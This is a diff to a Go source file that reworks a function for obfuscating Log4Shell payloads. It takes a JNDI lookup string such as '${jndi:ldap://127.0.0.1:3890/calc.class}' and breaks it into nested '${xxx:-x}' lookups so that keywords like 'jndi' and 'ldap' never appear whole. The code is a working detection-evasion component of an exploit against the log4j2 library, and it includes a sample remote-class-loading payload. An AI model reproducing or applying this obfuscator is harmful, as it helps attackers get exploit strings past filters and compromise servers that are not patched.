@@ -5,57 +5,64 @@ import (
 	"strings"
 )
 
-// TODO output generated string
-// var obf string
-//	flag.StringVar(&obf, "obf", "", "")
-//	flag.Parse()
-//
-//	if obf != "" {
-//		fmt.Println(log4shell.Obfuscate(obf))
-//		os.Exit(0)
-//	}
-
 // raw: ${jndi:ldap://127.0.0.1:3890/calc.class}
 //
 // obfuscate rule:
 // 1. ${xxx-xxx:any-code:-bc} => bc
 
+// skippedChars contain skip character, if Obfuscate
+// select section contains these characters, they will
+// not be obfuscated.
+var skippedChars = map[byte]struct{}{
+	'$': {},
+	'{': {},
+	'}': {},
+}
+
 // Obfuscate is used to obfuscate malicious(payload) string like
 // ${jndi:ldap://127.0.0.1:3890/calc.class} for log4j2 package.
 func Obfuscate(raw string) string {
 	l := len(raw)
-	if l < 3 {
+	if l == 0 {
 		return ""
 	}
 	obfuscated := strings.Builder{}
-	obfuscated.WriteString("${")
 
-	remaining := len(raw) - len("${}")
-	idx := 2
+	remaining := l
+	index := 0
+
 	// prevent not obfuscate twice, otherwise maybe
 	// generate string like 1."jn" 2."di" -> "jndi"
 	lastObfuscated := true
 
 	for {
 		// first select section length
-
 		// use 0-3 is used to prevent include special
 		// string like "jndi", "ldap" and "http"
-		sl := rand.Intn(4)
-		if sl > remaining {
-			sl = remaining
+		size := rand.Intn(4)
+		if size > remaining {
+			size = remaining
 		}
-		section := raw[idx : idx+sl]
+		section := raw[index : index+size]
 
-		if !randBool() && lastObfuscated {
+		// contain special character
+		var skip bool
+		for i := 0; i < len(section); i++ {
+			_, ok := skippedChars[section[i]]
+			if ok {
+				skip = true
+			}
+		}
+
+		if skip || (!randBool() && lastObfuscated) {
 			// not obfuscate
 			obfuscated.WriteString(section)
 
-			remaining -= sl
+			remaining -= size
 			if remaining <= 0 {
 				break
 			}
-			idx += sl
+			index += size
 			lastObfuscated = false
 			continue
 		}
@@ -79,14 +86,13 @@ func Obfuscate(raw string) string {
 		obfuscated.WriteString(section)
 		obfuscated.WriteString("}")
 
-		remaining -= sl
+		remaining -= size
 		if remaining <= 0 {
 			break
 		}
-		idx += sl
+		index += size
 		lastObfuscated = true
 	}
 
-	obfuscated.WriteString("}")
 	return obfuscated.String()
 }
